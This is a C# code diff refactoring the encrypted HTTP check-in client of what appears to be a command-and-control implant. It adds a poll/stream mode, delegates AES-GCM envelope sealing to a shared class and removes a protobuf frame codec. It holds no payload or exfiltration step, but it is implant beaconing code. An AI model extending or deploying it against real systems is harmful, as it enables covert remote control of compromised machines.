@@ -101,6 +101,12 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     // semantics below make the retransmission itself idempotent.
     private long _checkInCounter;
 
+    // The check-in mode this client serves: the web URL shape splits by it
+    // (architecture.md Sec 8) -- poll runs this POST cycle, stream holds the
+    // WebSocket stream (WsBeacon). Defaults to poll, the shape this client
+    // has always been.
+    private readonly string _mode;
+
     public EnvelopeBeacon(
         EgressEndpoints egress,
         string implantId,
@@ -114,7 +120,8 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         TextWriter log,
         TaskNonceTracker? nonces = null,
         TransportProfile? transport = null,
-        Cadence? cadence = null)
+        Cadence? cadence = null,
+        string mode = BeaconModes.Poll)
     {
         _egress = egress;
         _implantId = implantId;
@@ -137,14 +144,18 @@ internal sealed class EnvelopeBeacon : ICheckInClient
         _seal = transport is { SealsCheckIns: true }
             ? ParseBakedKey(transport.EnvelopeKey)
             : null;
+        _mode = mode;
     }
 
     /// <summary>
-    /// This client carries the web URL shape (architecture.md Sec 8): a
-    /// beacon URL naming an http(s) front. A bare host:port (the mTLS
-    /// listener dial shape) belongs to the gRPC stream client instead.
+    /// This client carries the web URL shape on a poll-mode bake
+    /// (architecture.md Sec 8): a beacon URL naming an http(s) front runs
+    /// this POST cycle when the profile polls; a stream-mode web URL belongs
+    /// to the WebSocket stream client instead, and a bare host:port (the
+    /// mTLS listener dial shape) to the gRPC stream client.
     /// </summary>
-    public bool Serves(string beaconUrl) => BeaconUrl.IsWeb(beaconUrl);
+    public bool Serves(string beaconUrl)
+        => BeaconUrl.IsWeb(beaconUrl) && _mode != BeaconModes.Stream;
 
     /// <summary>
     /// Composes the check-in URL off a beacon URL: the scheme and authority
@@ -532,97 +543,22 @@ internal sealed class EnvelopeBeacon : ICheckInClient
     private const string CheckInResponseAad = "rod-checkin-response-v1";
 
     // Splits the baked envelope key (standard base64 of keyId(16) || key(32))
-    // into its halves, or null when malformed -- a bad bake falls back to the
-    // plaintext frame rather than checking in undecodably. Internal for the
-    // unit tests, which pin the sealed wire shape.
+    // into its halves. Delegates to the shared EnvelopeWire, the seal every
+    // web client carries; internal for the unit tests, which pin the baked
+    // key shape.
     internal static (byte[] KeyId, byte[] Key)? ParseBakedKey(string baked)
-    {
-        if (baked.Length == 0)
-            return null;
-        byte[] packed;
-        try
-        {
-            packed = Convert.FromBase64String(baked);
-        }
-        catch (FormatException)
-        {
-            return null;
-        }
-        if (packed.Length != 16 + 32)
-            return null;
-        return (packed[..16], packed[16..]);
-    }
+        => EnvelopeWire.ParseBakedKey(baked);
 
-    // The sealed check-in wire shape, the teamserver's AesGcmEnvelope
-    // contract reimplemented verbatim: base64 of
-    // b"R1" || keyId(16) || nonce(12) || ciphertext || tag(16), returned as
-    // the body bytes to POST (base64 text -- the body reads as an opaque
-    // string, not a structured binary). Internal for the unit tests, which
-    // pin the sealed wire shape.
+    // The sealed check-in wire shape, delegated to the shared EnvelopeWire.
+    // Internal for the unit tests, which pin the sealed wire shape.
     internal static byte[] SealCheckInBody(ReadOnlySpan<byte> plaintext, byte[] keyId, byte[] key, string aad)
-    {
-        var nonce = RandomNumberGenerator.GetBytes(12);
-        var ciphertext = new byte[plaintext.Length];
-        var tag = new byte[16];
-        using (var aes = new AesGcm(key, 16))
-        {
-            aes.Encrypt(nonce, plaintext, ciphertext, tag, System.Text.Encoding.UTF8.GetBytes(aad));
-        }
+        => EnvelopeWire.SealCheckInBody(plaintext, keyId, key, aad);
 
-        var body = new byte[2 + 16 + 12 + ciphertext.Length + 16];
-        var position = 0;
-        "R1"u8.CopyTo(body.AsSpan(position));
-        position += 2;
-        keyId.AsSpan().CopyTo(body.AsSpan(position));
-        position += 16;
-        nonce.AsSpan().CopyTo(body.AsSpan(position));
-        position += 12;
-        ciphertext.AsSpan().CopyTo(body.AsSpan(position));
-        position += ciphertext.Length;
-        tag.AsSpan().CopyTo(body.AsSpan(position));
-        return System.Text.Encoding.UTF8.GetBytes(Convert.ToBase64String(body));
-    }
-
-    // Opens what SealCheckInBody sealed under the same key id and purpose
-    // tag: authenticates the GCM tag and returns the plaintext, or null on
-    // any mismatch (wrong key, tampered bytes, foreign shape) -- the caller
-    // drops the whole cycle rather than acting on a partial read. Internal
-    // for the unit tests, which pin the sealed wire shape.
+    // Opens what SealCheckInBody sealed, delegated to the shared
+    // EnvelopeWire. Internal for the unit tests, which pin the sealed wire
+    // shape.
     internal static byte[]? TryOpenCheckInBody(byte[] body, byte[] keyId, byte[] key, string aad)
-    {
-        string text;
-        byte[] packed;
-        try
-        {
-            text = System.Text.Encoding.UTF8.GetString(body).Trim();
-            packed = Convert.FromBase64String(text);
-        }
-        catch (Exception ex) when (ex is FormatException or System.Text.DecoderFallbackException)
-        {
-            return null;
-        }
-        if (packed.Length < 2 + 16 + 12 + 16)
-            return null;
-        if (!packed.AsSpan(0, 2).SequenceEqual("R1"u8))
-            return null;
-        if (!packed.AsSpan(2, 16).SequenceEqual(keyId))
-            return null;
-        var nonce = packed.AsSpan(2 + 16, 12).ToArray();
-        var ciphertextLength = packed.Length - 2 - 16 - 12 - 16;
-        var ciphertext = packed.AsSpan(2 + 16 + 12, ciphertextLength).ToArray();
-        var tag = packed.AsSpan(packed.Length - 16).ToArray();
-        var plaintext = new byte[ciphertextLength];
-        try
-        {
-            using var aes = new AesGcm(key, 16);
-            aes.Decrypt(nonce, ciphertext, tag, plaintext, System.Text.Encoding.UTF8.GetBytes(aad));
-        }
-        catch (CryptographicException)
-        {
-            return null;
-        }
-        return plaintext;
-    }
+        => EnvelopeWire.TryOpenCheckInBody(body, keyId, key, aad);
 
     // One client per cycle, mirroring the gRPC beacon's per-cycle channel:
     // the walk's current entry decides the shape -- https pins the teamserver
@@ -650,90 +586,5 @@ internal sealed class EnvelopeBeacon : ICheckInClient
             handler = new SocketsHttpHandler();
         }
         return new HttpClient(handler) { Timeout = TransportProfile.DefaultRequestTimeout };
-    }
-}
-
-/// <summary>
-/// The envelope wire codec (extending/implants.md): the protobuf canonical
-/// delimited-stream shape -- an unsigned varint byte length before each
-/// marshaled <see cref="Frame"/> -- in ordinary request/response bodies. The
-/// implant-side mirror of the teamserver's framing, kept here so the implant
-/// builds against the protocol alone.
-/// </summary>
-internal static class EnvelopeCodec
-{
-    /// <summary>
-    /// Encodes frames as one delimited sequence for a request body.
-    /// </summary>
-    public static byte[] Encode(IReadOnlyList<Frame> frames)
-    {
-        var body = new MemoryStream();
-        foreach (var frame in frames)
-        {
-            var marshaled = frame.ToByteArray();
-            WriteVarint(body, marshaled.Length);
-            body.Write(marshaled);
-        }
-        return body.ToArray();
-    }
-
-    /// <summary>
-    /// Parses a delimited frame sequence out of a response body. Throws
-    /// <see cref="InvalidOperationException"/> on malformed framing (a
-    /// truncated or oversized varint, a declared length past the body, or an
-    /// unparseable frame) -- the caller treats the whole cycle as dropped
-    /// rather than acting on a partial read.
-    /// </summary>
-    public static List<Frame> Parse(byte[] body)
-    {
-        var frames = new List<Frame>();
-        var position = 0;
-        while (position < body.Length)
-        {
-            if (!TryReadVarint(body, ref position, out var length))
-                throw new InvalidOperationException("envelope body carried a malformed frame delimiter");
-            if (position + length > body.Length)
-                throw new InvalidOperationException("envelope body declared a frame past its end");
-            Frame frame;
-            try
-            {
-                frame = Frame.Parser.ParseFrom(body, position, (int)length);
-            }
-            catch (Google.Protobuf.InvalidProtocolBufferException)
-            {
-                throw new InvalidOperationException("envelope body carried an unparseable frame");
-            }
-            frames.Add(frame);
-            position += (int)length;
-        }
-        return frames;
-    }
-
-    private static bool TryReadVarint(byte[] source, ref int position, out uint value)
-    {
-        value = 0;
-        var shift = 0;
-        for (var consumed = 0; consumed < 5; consumed++)
-        {
-            if (position >= source.Length)
-                return false;
-            var b = source[position++];
-            value |= (uint)(b & 0x7f) << shift;
-            if ((b & 0x80) == 0)
-                return true;
-            shift += 7;
-        }
-        return false; // More than 5 bytes: not a uint32 varint.
-    }
-
-    private static void WriteVarint(MemoryStream target, int value)
-    {
-        uint remaining = (uint)value;
-        while (remaining >= 0x80)
-        {
-            target.WriteByte((byte)(remaining | 0x80));
-            remaining >>= 7;
-        }
-        target.WriteByte((byte)remaining);
     }
 }
